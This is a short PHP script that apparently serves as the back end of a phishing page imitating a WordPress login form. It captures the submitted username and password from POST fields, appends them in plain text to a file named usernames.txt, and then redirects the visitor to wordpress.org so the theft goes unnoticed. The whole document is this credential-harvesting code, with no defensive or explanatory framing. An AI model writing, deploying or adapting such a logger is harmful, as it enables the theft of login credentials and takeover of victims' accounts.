<?php
file_put_contents("../usernames.txt", "wordpress Username: " . $_POST['log'] . " Pass: " . $_POST['pwd'] ."\n", FILE_APPEND);
header('Location: https://wordpress.org');
exit();
?>